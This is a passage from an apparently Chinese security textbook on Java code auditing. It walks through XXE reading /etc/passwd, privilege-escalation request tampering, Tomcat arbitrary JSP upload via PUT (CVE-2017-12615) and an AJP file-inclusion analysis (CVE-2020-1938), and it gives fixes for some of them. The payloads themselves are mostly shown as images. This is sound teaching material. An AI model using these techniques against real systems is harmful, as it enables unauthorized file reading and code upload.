XXE漏洞简介</h3><p>“XXE”是XML External Entity Injection（XML外部实体注入）的英文缩写。当开发人员配置其XML解析功能允许外部实体引用时，攻击者可利用这一可引发安全问题的配置方式，实施任意文件读取、内网端口探测、命令执行、拒绝服务攻击等方面的攻击。</p><p>为了更好地理解“XML 外部实体注入”的含义，让我们首先了解一下Payload的结构，如图5-38所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221131524.png" alt="image-20220422113129419"></p><p>图5-38　XXE Payload结构</p><p>图5-38中的DTD（Document Type Definition，文档类型定义）部分是XXE攻击的关键。我们可以将XML的“外部实体注入”拆分成“外部”“实体”与“注入”这三部分来看。其中的“实体”意指“DTD实体”，它是用于定义引用普通文本或特殊字符的快捷方式的变量；“外部”则与实体的使用方式有关，实体可分为“内部声明实体”和“引用外部实体”。“内部声明实体”的定义格式形如“<!ENTITY 实体名称 "实体的值">”，而“引用外部实体”的定义格式形如“<!ENTITY 实体名称 SYSTEM "URI/URL">”或者“<!ENTITY 实体名称 PUBLIC "public_ID" "URI">”。外部实体可支持http、file等协议。不同编程语言所支持的协议不同，Java默认提供对http、https、ftp、file、jar、netdoc、mailto、gopher等协议的支持；“注入”则意指攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p><h3 id="5-4-2-读取系统文件"><a href="#5-4-2-读取系统文件" class="headerlink" title="5.4.2　读取系统文件"></a>5.4.2　读取系统文件</h3><p>为了对该漏洞有更直观的认识，我们可以借助百度OpenRASP的测试用例进行测试。为了运行测试用例，我们将GitHub上已经编译的War包部署于Tomcat的webapps目录下。</p><p>OpenRASP测试用例中的007-xxe.jsp界面如图5-39所示，其中展示了攻击者尝试从服务端提取数据的攻击场景。在单击“不正常调用-Linux（读取&#x2F;etc&#x2F;passwd）”的链接后可以发现，这一系统敏感文件的内容已经被读取出来。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221135485.png" alt="image-20220422113501394"></p><p>007-xxe.jsp的源码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221141856.png" alt="image-20220422114134758"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221141540.png" alt="image-20220422114146408"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221142227.png" alt="image-20220422114213113"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221142145.png" alt="image-20220422114228020"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221142304.png" alt="image-20220422114253142"></p><p>对代码中的字符串linux_querystring进行UrlDecode解码可得到以下字符串：<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221143668.png" alt="image-20220422114308562"></p><p>我们可以在上面的XML中发现“file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd”。</p><p>该PoC的核心代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221145961.png" alt="image-20220422114547839"></p><p>通过分析上述代码可知，漏洞成因是该PoC使用了XML解析接口javax.xml.parsers.DocumentBuilder，但未禁用外部实体。</p><h3 id="5-4-3-修复案例"><a href="#5-4-3-修复案例" class="headerlink" title="5.4.3　修复案例"></a>5.4.3　修复案例</h3><p>使用XML解析器时需要设置其属性，禁止使用外部实体。XML解析器的安全使用可参考OWASP XML External Entity (XXE) Prevention Cheat Sheet。</p><p>以下以WebGoat 8的接口“POST &#x2F;WebGoat&#x2F;xxe&#x2F;simple”为例进行漏洞修复。</p><p>浏览该接口的代码，可以发现parsexml方法是解析XML的关键代码，如图5-45所示。</p><p>跟进parsexml方法可以发现，该关卡在解析XML时使用了类Javax.xml.stream.XMLInputFactory且存在不安全的配置方式，如图5-46所示。</p><p>OWASP XML External Entity (XXE) Prevention Cheat Sheet中对XMLInputFactory的建议配置方式如图5-47所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221150724.png" alt="image-20220422115054468"></p><p>图5-45　评论接口调用了parseXml方法<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221151440.png" alt="image-20220422115140252"></p><p>图5-47　查阅OWASP XML External Entity (XXE ) Prevention Cheat </p><p>Sheet依据该建议修改“POST &#x2F;WebGoat&#x2F;xxe&#x2F;simple”接口的代码，如图5-48所示。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221151512.png" alt="image-20220422115156338"></p><p>图5-48　进行禁用外部实体的安全配置</p><p>在修改代码后重新运行WebGoat，对“XXE读取系统文件”问题进行复测，可以发现该漏洞已经被修复。修复后的结果如图5-49所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221152011.png" alt="image-20220422115225789"></p><p>图5-49　在对代码进行加固后，XXE攻击失效</p><h2 id="5-5-失效的访问控制"><a href="#5-5-失效的访问控制" class="headerlink" title="5.5　失效的访问控制"></a>5.5　失效的访问控制</h2><h3 id="5-5-1-失效的访问控制漏洞简介"><a href="#5-5-1-失效的访问控制漏洞简介" class="headerlink" title="5.5.1　失效的访问控制漏洞简介"></a>5.5.1　失效的访问控制漏洞简介</h3><p>失效的访问控制是指未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如访问其他用户的账户、查看敏感文件、修改其他用户的数据、更改访问权限等。业界常将典型的越权漏洞划分为横向越权与纵向越权这两类。</p><p>下面通过一个在某在线教育网站的“普通用户篡改其他普通用户的密码”的案例说明“横向越权”的代码审计问题，并通过“黑盒+白盒”的方式进行探究。“黑盒测试”（漏洞复现）的过程如下。</p><p>在实验前，受害者（<a href="mailto:&#108;&#x6d;&#x78;&#49;&#57;&#51;&#x40;&#49;&#54;&#51;&#x2e;&#x63;&#111;&#109;">&#108;&#x6d;&#x78;&#49;&#57;&#51;&#x40;&#49;&#54;&#51;&#x2e;&#x63;&#111;&#109;</a>&#x2F;111111）的姓名和昵称均为“受害者”（通过查看数据库，可知用户ID为“1”），如图5-50所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221425268.png" alt="image-20220422142528134"></p><p>图5-50　横向越权的受害者</p><p>而攻击者（<a href="mailto:&#x6c;&#x6d;&#x69;&#x6e;&#x67;&#120;&#x69;&#x6e;&#103;&#64;&#x69;&#x6e;&#120;&#x65;&#100;&#117;&#x2e;&#x63;&#x6f;&#x6d;">&#x6c;&#x6d;&#x69;&#x6e;&#x67;&#120;&#x69;&#x6e;&#103;&#64;&#x69;&#x6e;&#120;&#x65;&#100;&#117;&#x2e;&#x63;&#x6f;&#x6d;</a>&#x2F;111111）的姓名和昵称均为“攻击者”，如图5-51所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221425427.png" alt="image-20220422142550184"></p><p>图5-51　横向越权的攻击者</p><p>接下来，我们模拟以攻击者的视角开始横向越权攻击。使用BurpSuite抓取“提交用户基本资料”的数据包如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221427502.png" alt="image-20220422142702374"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221433141.png" alt="image-20220422143324012"></p><p>我们可以在该请求报文中发现参数“user.userId”是“3”，一个用户可控的参数。接着，我们可以将参数“user.userId”的值替换为“1”，将参数“user.userName”与“user.showName”的值替换为“hacked byattacker”，如图5-52所<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221434382.png" alt="image-20220422143403985"></p><p>图5-52　替换参数的值</p><p>随后，如果以受害者的视角查看其基本资料，则可以发现其“姓名”和“昵称”均被替换成“hacked by attacker”，如图5-53所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221434183.png" alt="image-20220422143440039"></p><p>接下来进行“白盒”代码审计。经过观察代码的结构&#x3D;&#x3D;，可以发现代码按典型的Java业务代码逻辑处理顺序“Controller→Service接口→serviceImpl→DAO接口→daoImpl→mapper→db”进行了组织&#x3D;&#x3D;。为了找到漏洞触发点，可以考虑以下两种方式。</p><p>（1）在源码中搜索接口中的关键字符串（如接口“POST&#x2F;inxedu&#x2F;uc&#x2F;updateUser”中的“updateUser”）。</p><p>（2）通过了解源码的结构，探查可能的类与方法（如在源码包com.inxedu.os. edu.controller.user中找到关键的控制器类UserController中的方法updateUserInfo），该关键方法的源码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221443381.png" alt="image-20220422144358258"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204221444230.png" alt="image-20220422144442090"></p><p>通过分析上述代码，我们可将注意力集中在“userService.updateUser(user);”代码行，如图5-54所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222008662.png" alt="image-20220422200852530"></p><p>图5-54　关注“userService.updateUser(user);”代码行</p><p>我们可以在该Controller类中发现，userService是接口的UserService实例化对象，如图5-55所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222009259.png" alt="image-20220422200917826"></p><p>此时，为了找到实现接口“UserService”的类，可以在源码中搜索字符串“implements UserService”，如图5-56所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222012080.png" alt="image-20220422201225961"></p><p>图5-56　搜索字符串“implements UserService”</p><p>由图5-56可知，“demo_inxedu_open\src\main\java\com\inxedu\os\edu\service\impl\ user\UserServiceImpl.java”是该接口的实现类，如图5-57所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222012587.png" alt="image-20220422201242027"></p><p>图5-57　接口的实现类</p><p>由图5-57可知，方法updateUser调用了UserDao的对象userDao所调用的updateUser方法。继续审计UserDao，可以发现UserDao也是一个接口，如图5-58所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222014566.png" alt="image-20220422201432438"></p><p>图5-58　继续审计UserDao</p><p>此时，为了找到实现接口“UserDao”的类，可以在源码中搜索字符串“implements UserDao”，如图5-59所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222015792.png" alt="image-20220422201547661"></p><p>图5-59　搜索字符串“implements UserDao”</p><p>由图5-59可知，open-inxedu-master\inxedu\demo_inxedu_open\src\main\java\com\inxedu\os\edu\dao\impl\user\UserDaoImpl.java是该接口的实现类。查看UserDaoImpl类对updateUser方法的实现，如图5-60所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222020934.png" alt="image-20220422202022814"></p><p>图5-60　查看updateUser方法的实现</p><p>由图5-60可知，该类使用UserMapper进行查询，为了找到与&#x3D;&#x3D;UserMapper类相关的XML配置文&#x3D;&#x3D;件，可以在源码中搜索字符串“UserMapper”，如图5-61所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222023902.png" alt="image-20220422202324387"></p><p>图5-61　搜索字符串“UserMapper</p><p>由图5-62可知，XML配置文件的位置为“demo_inxedu_open\src\main\resources\mybatis\inxedu\user\UserMapper.xml”。通过观察可以发现，在引用Mapper文件进行数据更新操作之前，算法未对发送HTTP请求的用户进行用户身份合法性的校验，也未对请求进行权限控制，于是形成了该横向越权漏洞。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222027908.png" alt="image-20220422202719783"></p><p>图5-62　横向越权漏洞的形成</p><h3 id="5-5-3-纵向越权"><a href="#5-5-3-纵向越权" class="headerlink" title="5.5.3　纵向越权"></a>5.5.3　纵向越权</h3><p>下面通过一个在某租车系统演示网站的“由低权限用户创建超级管理员”的案例来说明“纵向越权”的代码审计问题，并通过“黑盒+白盒”的方式进行探究。“黑盒测试”（漏洞复现）的过程如下。</p><p>（1）安装部署CMS。</p><p>（2）以超级管理员（admin）的权限登录网站后台，并创建“客服”角色的用户“customerservice2”（在创建的同时，可以通过Burp Suite抓取网站接口信息来进行分析），如图5-63所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222030199.png" alt="image-20220422203025064"></p><p>图5-63　创建“客服”角色的用户</p><p>（3）以客服（customerservice2）的权限登录网站后台，（在登录的同时，可以通过Burp Suite抓取网站接口信息，以获取身份认证信息），如图5-64所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222032322.png" alt="image-20220422203245199"></p><p>图5-64　以客服的权限登录网站后台</p><p>登录后可以发现，客服账户界面是空白的，客服账户未被赋予操作权限，如图5-65所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222033405.png" alt="image-20220422203304293"></p><p>图5-65　客服账户界面为空白</p><p>通过图5-65，我们可以获知客服customerservice2的Cookie信息。</p><p>（4）进行越权测试。将图5-63中的“添加客户”的关键接口信息同图5-65中的“有效客服Cookie”组合起来，尝试发送HTTP请求包，如图5-66所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222038624.png" alt="image-20220422203842488"></p><p>图5-66　越权测试</p><p>通过测试，可以发现“客服”可以调用原本“超级管理员”才可以访问的接口并进行“客服”用户的添加。因此，我们可以判断此处存在纵向越权漏洞。</p><p>接下来进行“白盒”代码审计。为了进行审计，可在项目工程中对关键的Jar包进行分析（我们可以定位到“WEB-INF&#x2F;lib”目录下的文件“car-weishang-1.0.jar”），如图5-67所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222040064.png" alt="image-20220422204013706"></p><p>图5-67　分析关键的Jar包</p><p>接着，我们可以通过JD-GUI等工具对该Jar包进行反编译。com.weishang. action.Admin包中的doPost方法如图5-68所示</p><p>图5-68　反编译Jar包<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222047829.png" alt="image-20220422204655918"></p><p>由图5-68可知，该接口在接收到HTTP请求参数后，未对发送者的身份进行认证鉴权，就将数据进行保存，这是此处越权漏洞的成因。</p><h3 id="5-5-4-小结"><a href="#5-5-4-小结" class="headerlink" title="5.5.4　小结"></a>5.5.4　小结</h3><p>这里可将“失效的访问控制”理解为“越权”。细化权限是安全体系中非常重要的一环。由于缺乏自动化检测，以及应用程序开发人员缺乏有效的功能测试，因而访问控制缺陷很常见。本节介绍的“横向越权”与“纵向越权”反映了越权漏洞挖掘的基本思路，而常见的访问控制脆弱点不只是示例中介绍的用户的增、删、改、查接口，还包括CORS配置错误允许未授权的API访问，通过修改 URL、内部应用程序状态或 HTML 页面绕过访问控制检查，权限框架缺陷（如ApacheShiro 身份验证绕过漏洞 CVE-2020-11989）等场景。在进行专项的代码审计时，可重点关注“处理用户操作请求时”是否对当前登录用户的权限进行校验，进而确定是否存在越权漏洞。</p><h2 id="5-6-安全配置错误"><a href="#5-6-安全配置错误" class="headerlink" title="5.6　安全配置错误"></a>5.6　安全配置错误</h2><p>安全配置错误是常见的安全问题之一，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时进行修补和升级。</p><h3 id="5-6-1-安全配置错误漏洞简介"><a href="#5-6-1-安全配置错误漏洞简介" class="headerlink" title="5.6.1　安全配置错误漏洞简介"></a>5.6.1　安全配置错误漏洞简介</h3><p>安全配置错误可以发生在一个应用程序堆栈的任何层面，包括网络服务、平台、Web服务器、应用服务器、数据库、框架、自定义的代码、预安装的虚拟机、容器、存储等。这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。</p><h3 id="5-6-2-Tomcat任意文件写入（CVE-2017-12615）"><a href="#5-6-2-Tomcat任意文件写入（CVE-2017-12615）" class="headerlink" title="5.6.2　Tomcat任意文件写入（CVE-2017-12615）"></a>5.6.2　Tomcat任意文件写入（CVE-2017-12615）</h3><p>向Tomcat发起PUT 请求，请求的报文如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222054079.png" alt="image-20220422205421955"></p><p>服务端返回状态码201，说明创建成功，如图5-69所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222057529.png" alt="image-20220422205723398"></p><p>图5-69　创建成功</p><p>请求1.jsp页面，返回结果如图5-70所示，证明1.jsp上传成功，且被Tomcat正常解析<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222107043.png" alt="image-20220422210754932"></p><p>图5-70　1.jsp上传成功</p><p>Tomcat在处理请求时有两个默认的Servlet，一个是DefaultServelt，另一个是JspServlet。两个Servlet被配置在Tomcat的web.xml中，具体配置信息如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222112817.png" alt="image-20220422211253701"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222113902.png" alt="image-20220422211325639"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222110550.png" alt="image-20220422211031418"></p><p>从以上配置信息不难看出，JspServlet只处理后缀为.jsp 和.jspx的请求。其他请求都由DefaultServlet进行处理。</p><p>从这一点可以理解为何 PUT请求时 URI为“&#x2F;1.jsp&#x2F;”而不直接使用“&#x2F;1.jsp”，因为直接PUT 请求“&#x2F;1.jsp”会由JspServlet进行处理，而不是由DefaultServlet处理，所以无法触发漏洞。</p><p>&#x3D;&#x3D;众所周知，想要实现一个Servlet，就必须要继承HttpServlet，DefaultServlet也不例外&#x3D;&#x3D;。在HttpServlet中有一个doPut方法用来处理PUT方法请求，DefaultServlet重写了该方法。</p><p>重写DefaultServlet后的doPut方法的部分代码如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222119756.png" alt="image-20220422211904643"></p><p>该方法的开端就判断了一个readOnly属性，当结果为true时会直接返回403，所以要将该值设置为true。readOnly属性的值来源于Tomcat 的web.xml的配置，在DefaultServlet的配置中添加一项参数，如下所示。Tomcat启动时会读取web.xml，并在用户第一次请求时将DefaultServlet的readOnly属性赋值为false。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222120371.png" alt="image-20220422212028967"></p><p>doPut方法的关键点在于resources.write (path,resourceInputStream, true) path变量存放的PUT请求的URI，如图5-71所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222123354.png" alt="image-20220422212310239"></p><p>图5-71　PUT请求的URI</p><p>doPut方法的代码如图5-72所示，在第184行，path作为参数传入了main.write方法中，并继续执行。</p><p>执行main.write方法后观察该方法，部分代码如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222131186.png" alt="image-20220422213110064"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222131724.png" alt="image-20220422213120537"></p><p>图5-72　doPut方法的代码</p><p>当执行到dest &#x3D; file(path.substring(webAppMount.length())时, false); path被作为参数再次传入，所以选择执行file方法，截取部分代码如下所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222133630.png" alt="image-20220422213300532"></p><p>file方法中实例化了一个File对象用户后续向目录中写入请求正文中的内容，name参数是我们PUT请求的URI，如图5-73所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222134511.png" alt="image-20220422213407384"></p><p>图5-73　name参数是URI</p><p>fileBase参数就是当前Web应用所在的绝对路径，如图5-74所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222134509.png" alt="image-20220422213442401"></p><p>图5-74　fileBase参数是当前Web应用的绝对路径</p><p>在File对象实例化的过程中会处理掉URL“&#x2F;1.jsp&#x2F;”的最后一个“&#x2F;”以及多余的“&#x2F;”符号，例如“&#x2F;com&#x2F;&#x2F;&#x2F;Test&#x2F;&#x2F;FileTest&#x2F;&#x2F;1.jsp&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;”经过处理会变成“&#x2F;com&#x2F;Test&#x2F;FileTest&#x2F; 1.jsp”，因此，通过PUT请求，“&#x2F;1.jsp&#x2F;”可以达到上传任意文件的目的。</p><h3 id="5-6-3-Tomcat-AJP-文件包含漏洞（CVE-2020-1938）"><a href="#5-6-3-Tomcat-AJP-文件包含漏洞（CVE-2020-1938）" class="headerlink" title="5.6.3　Tomcat AJP 文件包含漏洞（CVE-2020-1938）"></a>5.6.3　Tomcat AJP 文件包含漏洞（CVE-2020-1938）</h3><h4 id="1．Tomcat-AJP文件包含漏洞简介"><a href="#1．Tomcat-AJP文件包含漏洞简介" class="headerlink" title="1．Tomcat AJP文件包含漏洞简介"></a>1．Tomcat AJP文件包含漏洞简介</h4><p>2020年2月20日，CNVD公开的漏洞公告中发现Apache Tomcat文件包含漏洞（CVE-2020-1938）。</p><p>Apache Tomcat是Apache开源组织开发的用于处理HTTP服务的项目。Apache Tomcat服务器中被发现存在文件包含漏洞，攻击者可利用该漏洞读取或包含 Tomcat 上所有 webapp 目录下的任意文件。</p><p>该漏洞是一个单独的文件包含漏洞，依赖于Tomcat的AJP（定向包协议）。AJP自身存在一定缺陷，导致存在可控参数，通过可控参数可以导致文件包含漏洞。AJP协议使用率约为7.8%，鉴于Tomcat作为中间件被大范围部署在服务器上，该漏洞危害较大。</p><h4 id="2．AJP13协议介绍"><a href="#2．AJP13协议介绍" class="headerlink" title="2．AJP13协议介绍"></a>2．AJP13协议介绍</h4><p>Tomcat主要有两大功能，一是充当Web服务器，可以对一切静态资源的请求作出回应；二是充当Servlet容器。常见的Web服务器有Apache、Nginx、IIS等。常见的Servlet容器有Tomcat、Weblogic、JBOSS等。</p><p>Servlet容器可以理解为Web服务器的升级版。以Tomcat为例，Tomcat本身可以不作为Servlet容器使用，仅仅充当Web服务器的角色，但是其处理静态资源请求的效率和速度远不及Apache，所以很多情况下生产环境会将Apache作为Web服务器来接收用户的请求。静态资源由Apache直接处理，而Servlet请求则交由Tomcat来进行处理。这种方式使两个中间件各司其职，大大加快了响应速度。</p><p>众所周知，用户的请求是以HTTP协议的形式传递给Web服务器。我们在浏览器中对某个域名或者ip进行访问时，头部都会有http或者https的表示，而AJP浏览器是不支持的，我们无法通过浏览器发送AJP的报文。AJP这个协议并不是提供给用户使用的。</p><p>Tomcat$ CATALINA_BASE&#x2F;conf&#x2F;web.xml默认配置了两个Connector，分别监听两个不同的端口，一个是HTTP Connector 默认监听8080端口，另一个是AJP Connector 默认监听8009端口。</p><p>HTTP Connector主要负责接收来自用户的请求，包括静态请求和动态请求。有了HTTP Connector，Tomcat才能成为一个Web服务器，还可以额外处理Servlet和JSP。</p><p>而AJP的使用对象通常是另一个Web服务器，例如Apache，这里以图5-75进行说明。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222153092.png" alt="image-20220422215300981"></p><p>图5-75　Apache服务器</p><p>AJP是一个二进制的TCP传输协议。浏览器无法使用AJP，而是首先由Apache与Tomcat进行AJP的通信，然后由Apache通过proxy_ajp模块进行反向代理，将其转换成HTTP服务器再暴露给用户，允许用户进行访问。</p><p>这样做的原因是，相对于HTTP纯文本协议来说，效率和性能更高，同时也做了很多优化。</p><p>在某种程度上，AJP可以理解为HTTP的二进制版，因加快传输效率被广泛应用。实际情况是类似Apache这样有proxy_ajp模块可以反向代理AJP协议的服务器很少，所以AJP协议在生产环境中也很少被用到。</p><h4 id="3．Tomcat-远程文件包含漏洞分析"><a href="#3．Tomcat-远程文件包含漏洞分析" class="headerlink" title="3．Tomcat 远程文件包含漏洞分析"></a>3．Tomcat 远程文件包含漏洞分析</h4><p>首先从官网下载对应的Tomcat源码文件和可执行文件</p><p>两个文件夹下载好后，存放入在同一个目录下，然后在源码中新增pom.xml，并添加以下内容。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222237818.png" alt="image-20220422223713693"><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222237683.png" alt="image-20220422223724543"></p><p>然后添加一个Application，如图5-77所示。</p><h4 id="这里直接漏洞分析"><a href="#这里直接漏洞分析" class="headerlink" title="这里直接漏洞分析"></a>这里直接漏洞分析</h4><p>首先定位到类 org.apache.coyote.ajp.AjpProcessor。根据网上透漏的漏洞消息，得知漏洞的产生是由于Tomcat对ajp传递过来的数据的处理方式存在问题，导致用户可以控制“javax.servlet.include.request_uri”“javax.servlet.include.path_info”“javax. servlet.include.servlet_path”这3个参数，从而读取任意文件，甚至可以进行RCE。</p><p>我们先从任意文件读取开始分析。环境使用Tomcat 8.0.50版本搭建，产生漏洞的原因并不在于AjpProcessor.prepareRequest()方法。8.0.50版本的漏洞点存在于AjpProcessor的父类，即AbstractAjpProcessor抽象类的prepareRequest()中，如图5-83所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222313982.png" alt="image-20220422231303862"></p><p>图5-83　漏洞点分析</p><p>在这里设置断点，然后运行exp，查看此时的调用链，如图5-84所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222316047.png" alt="image-20220422231635882"></p><p>图5-84　设置断点并运行exp</p><p>由于此次数据传输使用的是AJP，经过8009口，并非我们常见的HTTP，因此首先由内部类SocketPeocessore来进行处理。</p><p>处理完成后，经过几次调用交由AbstractAjpProcessor.prepareRequest()方法，该方法是漏洞产生的第一个点，如图5-85所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222318001.png" alt="image-20220422231840153"></p><p>图5-85　漏洞产生的第一个点</p><p>单步执行request.setAttribute()方法，如图5-86和图5-87所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222321333.png" alt="image-20220422232139240"></p><p>图5-86　单步执行request.setAttribute()方法（一）<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222324206.png" alt="image-20220422232408890"></p><p>图5-87　单步执行request.setAttribute()方法（二）</p><p>这里我们可以看到，attributes是一个HashMap，&#x3D;&#x3D;将通过AJP传递过来的3个参数&#x3D;&#x3D;循环遍历存入这个HashMap，如图5-88所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222337886.png" alt="image-20220422233720692"></p><p>图5-88　存储3个参数的HashMap<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222337728.png" alt="image-20220422233737347"></p><p>图5-89　while循环完成后的结果</p><p>先来查看exp发出的数据包，如图5-90所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222340682.png" alt="image-20220422234014537"></p><p>图5-90　exp发出的数据包</p><p>通过使用WireShark抓包查看AJP报文的信息，其中有4个比较重要的参数如下。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222341386.png" alt="image-20220422234114303"></p><p>通过AJP传来的数据需要交由Servlet进行处理，那么应该交由哪个Servlet呢？</p><p>通过阅读关于Tomcat架构的文章和资料得知，&#x3D;&#x3D;Tomcat$ CATALINA_BASE&#x2F;conf&#x2F;web.xml配置文件中默认定义了两个Servlet&#x3D;&#x3D;：一个是DefaultServlet，如图5-91所示；另一个是JspServlet，如图5-92所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222343795.png" alt="image-20220422234316650"></p><p>图5-91　默认定义的DefaultServlet<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222344469.png" alt="image-20220422234414307"></p><p>图5-92　默认定义的JspServlet</p><p>&#x3D;&#x3D;由于$ CATALINA_BASE&#x2F;conf&#x2F;web.xml文件是tomcat启动时默认加载的，因此这两个Servlet会默认存放在Servlet容器中。&#x3D;&#x3D;</p><p>当用户请求的URI不能与任何Servlet匹配时，会默认交由 DefaultServlet来处理。DefaultServlet主要用于处理静态资源，如HTML、图片、CSS、JS文件等，而且为了提升服务器性能，Tomcat将对访问文件进行缓存。按照默认配置，客户端请求路径与资源的物理路径是一致的。</p><p>我们看到请求的URI为“&#x2F;asdf”，符合无法匹配后台任何Servlet的条件。这里需要注意的是，举例来说，我们请求一个“abc.jsp”，但是后台没有“abc.jsp”，这不属于无法匹配任何Servlet，因为.jsp的请求会默认由JspServlet进行处理，如图5-93所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222348783.png" alt="image-20220422234810596"></p><p>图5-93　无法匹配任何Servlet</p><p>根据上述内容，结合发送数据包中的“URI:&#x2F;asdf”这一属性，可以判断该请求是由DefaultServlet进行处理的。</p><p>定位到DefaultServlet的doGet方法，如图5-94所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222350913.png" alt="image-20220422235025755"></p><p>图5-94　定位到DefaultServlet的doGet方法</p><p>doGet方法中调用了serveResource()方法。serveResource()方法调用了getRelativePath()方法来进行路径拼接，如图5-95所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222352206.png" alt="image-20220422235230438"></p><p>图5-95　路径拼接</p><p>这里就是将传入的path_info、servlet_path进行复制的地方。request_uri用来做判断，如果发送的数据包中没有request_uri，就会执行else后面的两行代码进行赋值。这会导致漏洞利用失败，如图5-96所示<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222354528.png" alt="image-20220422235442376"></p><p>图5-96　执行代码进行赋值</p><p>接下来是对路径的拼接。这里可以看到，如果传递数据时不传递servlet_path，则result在进行路径拼接时不会将“&#x2F;”拼接在“WEB-INF&#x2F;web.xml”的头部。最后拼接的结果仍然是“WEB-INF&#x2F;web.xml”，如图5-97所示。<img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5C202204222356016.png" alt="image-20220422235629885"></p><p>图5-97　